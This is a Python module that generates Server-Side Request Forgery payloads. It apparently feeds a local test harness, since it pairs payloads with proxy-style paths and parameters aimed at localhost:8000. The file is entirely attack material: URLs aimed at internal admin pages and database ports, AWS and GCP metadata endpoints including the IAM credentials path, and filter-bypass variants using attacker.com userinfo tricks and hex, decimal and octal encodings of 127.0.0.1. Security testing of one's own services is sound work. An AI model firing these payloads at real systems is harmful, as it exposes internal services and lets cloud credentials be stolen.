"""
tools/ssrf_atk.py — Server-Side Request Forgery attack payload generator
"""
import random

_LOCALHOST = [
    "http://127.0.0.1/admin",
    "http://127.0.0.1:8080/internal",
    "http://localhost/admin",
    "http://localhost:9200/_cat/indices",  # Elasticsearch
    "http://127.0.0.1:6379/",             # Redis
    "http://127.0.0.1:27017/",            # MongoDB
]

_AWS_METADATA = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/2019-10-01/meta-data/ami-id",
]

_GCP_METADATA = [
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
]

_INTERNAL_SUBNET = [
    "http://10.0.0.1/admin",
    "http://192.168.1.1/config",
    "http://172.16.0.1/management",
    "http://10.0.0.100:8080/api/internal",
]

_DNS_REBINDING = [
    "http://attacker.com@127.0.0.1/admin",
    "http://127.0.0.1.attacker.com/",
    "http://0x7f000001/",        # 127.0.0.1 in hex
    "http://2130706433/",        # 127.0.0.1 in decimal
    "http://0177.0.0.1/admin",   # 127.0.0.1 in octal
]

ALL_PAYLOADS = _LOCALHOST + _AWS_METADATA + _GCP_METADATA + _INTERNAL_SUBNET + _DNS_REBINDING

SSRF_PATHS  = ["/proxy", "/fetch", "/request", "/load", "/api/proxy", "/webhook", "/redirect"]
SSRF_PARAMS = ["url", "target", "host", "src", "redirect", "callback", "endpoint"]


def generate() -> tuple[str, str]:
    payload = random.choice(ALL_PAYLOADS)
    path    = random.choice(SSRF_PATHS)
    param   = random.choice(SSRF_PARAMS)
    url     = f"http://localhost:8000{path}?{param}={payload}"
    return url, payload
